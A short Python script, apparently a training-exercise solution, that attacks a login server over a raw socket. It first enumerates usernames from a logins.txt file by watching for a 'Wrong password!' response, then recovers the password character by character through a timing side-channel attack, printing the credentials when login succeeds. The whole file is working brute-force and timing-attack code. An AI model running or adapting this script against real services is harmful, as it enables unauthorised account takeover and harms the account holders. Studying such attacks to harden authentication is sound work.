from itertools import combinations
from string import ascii_letters, digits
from datetime import datetime
import argparse
import socket
import json
import os

parser = argparse.ArgumentParser()
parser.add_argument('host', type=str, help="IP address")
parser.add_argument('port', type=int, help='Port number')
args = parser.parse_args()
host = args.host
port = args.port


client_socket = socket.socket()
users = []
with open(os.getcwd() + '/logins.txt') as login_file:
    for line in login_file:
        users.append(line.strip())

credentials = {
            "login": "",
            "password": " "
        }
try:
    client_socket.connect((host, port))
except ConnectionRefusedError as e:
    print(e)
except Exception as e:
    print("Other Exception:", e)


def getuser():
    for user in users:
        credentials["login"] = user
        start = datetime.now()
        client_socket.send(json.dumps(credentials).encode())
        received_data = client_socket.recv(1024)
        finish = datetime.now()
        result = json.loads(received_data.decode())['result']
        if result == "Wrong password!":
            return True


def getpass():
    abc = ascii_letters + digits
    for i in combinations(abc, 1):
        credentials["password"] += i[0]
        start = datetime.now()
        client_socket.send(json.dumps(credentials).encode())
        received_data = client_socket.recv(1024).decode()
        finish = datetime.now()
        time = finish - start
        result = json.loads(received_data)["result"]
        if result == "Wrong password!":
            if time.microseconds > 100000:
                getpass()
            else:
                string = list(credentials["password"])
                temp = string.pop()
                credentials["password"] = "".join(string)
        elif result == "Connection success!":
            json_output = json.dumps(credentials, indent=4)
            print(json_output)
            exit()


got_user = getuser()
if bool(got_user) is True:
    credentials["password"] = ""
    getpass()
